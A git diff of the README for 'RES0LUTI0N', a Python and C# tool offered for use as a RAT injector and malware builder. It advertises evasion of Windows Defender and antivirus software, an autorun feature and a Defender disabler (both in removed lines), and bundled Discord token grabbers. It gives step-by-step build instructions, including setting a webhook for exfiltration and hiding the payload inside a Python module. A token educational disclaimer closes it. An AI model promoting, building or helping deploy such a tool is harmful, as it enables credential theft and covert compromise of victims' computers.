@@ -3,20 +3,21 @@
 
 # RES0LUTI0N
 
-RES0LUTI0N is a RAT injector not detected by antivirus software coded in python and C#. It uses a randomized obfuscation system, a RAT partitioning system and a recompilation system at the same time. It is designed to bypass mainly Windows Defender
+RES0LUTI0N is a malware builder undetected by Windows Defender coded in python and C#. It uses a randomized obfuscation system, a RAT partitioning system and a recompilation system at the same time.
 ## Features
 
-- **Undetected by AV**
-- **Windows defender disabler**
-- **Registry autorun system**
-- **Can inject any python code, it will of course be made undetectable**
+- **Undetected by Windows Defender**
+- **Can build an undetectable malware .exe**
+- **Use 2 differents exe compiler**
+- **You can choice your own malware or use one already included**
+- **Can inject any python code, it will of course be made undetectable by antivirus**
 - **Easy to use**
 - **Quick use**
 
 ## Requirements
-- **Windows 7/8/10/11** OS only (*win32, for x86, x86_64, and arm64 architectures*)
+- **Windows 10/11** OS only (*win32, for x86, x86_64, and arm64 architectures*)
 - **Python 3.x** (*python 3.9 used for the project.*)
-- **Modules:** (*pywin32, requests*)
+- **Modules:** (*colorama, pypresence, pyinstaller, cx_freeze*)
 
 ## Usage
 ### 1. First step
@@ -37,27 +38,29 @@ python Res0luti0n.py
 
 1) Change the settings by pressing `2` and `enter`:
 
-![img](https://imgur.com/2T0nphh.png)
+![img](https://imgur.com/NjqT2hq.png)
 
-2) Select Choose the number you want to change the setting you want:
+2) Select Choose the number you want to change the setting you want and follow the instructions:
 *↦Hint: Start with the webhook which is the most important for the proper functioning of the program*
 
-![img](https://imgur.com/ysKokH4.png)
+![img](https://imgur.com/iQIwvBc.png)
 
 ### 4. Last step
-Press `4` if you are already in the parameter menu, otherwise just press `1` to build your RAT. 
-If you want to use the webhook option, it is necessary to replace the webhook in your RAT by `WBH`
-
+Press `5` if you are already in the parameter menu, otherwise just press `1` to build your RAT. 
 *↦Troubleshooting: If this does not work, check that you have entered the correct parameters (like a correct size for shoes)*
 
 ### 5. Usage
-For the proper functioning of the injector it is imperative that the entirety of what is in the ZIP created is located in the same directory. Of course, the folder containing the logos and the injector itself is deleted after being executed
+For the proper functioning of the injector it is imperative that the entirety of what is in the ZIP created is located in the same directory.
 
 *↦Hint: I recommend you to use it as a module in a python script, it allows to trivialize it and to hide it*
 
-## Troubleshooting
-- Don't forget to install `pywin32` and the necessary modules to your RAT on the target device
-- Verify python is installed properly
+## Thanks 
+### In this project malware bases are already included.
+ - Like [AstraaDev](https://github.com/AstraaDev) Token Grabber v2
+[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=AstraaDev&repo=Discord-Token-Grabber-V2&show_owner=true)](https://github.com/AstraaDev/Discord-Token-Grabber-V2)
+
+- Or Cooked Grabber by [Mouadessalim](https://github.com/mouadessalim)
+[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=mouadessalim&repo=Cookedgrabber&show_owner=true)](https://github.com/mouadessalim/CookedGrabber)
 
 ## Disclaimer
 - Only for **educationnal, personal or good puposes**.
